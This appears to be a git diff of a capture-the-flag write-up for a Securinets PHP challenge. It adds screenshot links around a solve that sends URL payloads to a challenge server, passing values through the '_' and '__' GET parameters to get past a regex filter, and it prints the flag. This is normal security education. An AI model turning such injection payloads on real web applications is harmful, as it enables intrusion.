@@ -36,6 +36,9 @@ else{
 
 trying to send **"Kahla"** in the **_** param prints out this prompt
 
+![a](https://user-images.githubusercontent.com/58823465/151814781-7f079c2b-0cf4-42eb-8a71-250713e79fca.png)
+
+
 Payload : ``` http://20.119.58.135:1234/?__=&_=Kahla; ``` 
 
 Output : ```Hacking Attempt detected```
@@ -48,7 +51,8 @@ so how about we use the **__** to send it to the **_** param? since it's not ver
 
 Payload : ``` http://20.119.58.135:1234/?__=Kahla&_=$_GET[__] ```
 
-Output : img
+Output : ![6](https://user-images.githubusercontent.com/58823465/151814811-b5b61141-c69c-47ba-a3dd-73827772fffc.png)
+
 
 well i guess we're pretty close :/ ?
 We can't use the **GET** to send the param because the regex won't allow the [] characters 
@@ -60,6 +64,7 @@ Payload : ``` http://20.119.58.135:1234/?__=Kahla&_=$x ```
 Output : ``` Securinets{PeehPee_1s_AlWAYs_H3r3} ```
 
 And there's our flag!
+
 
 
 
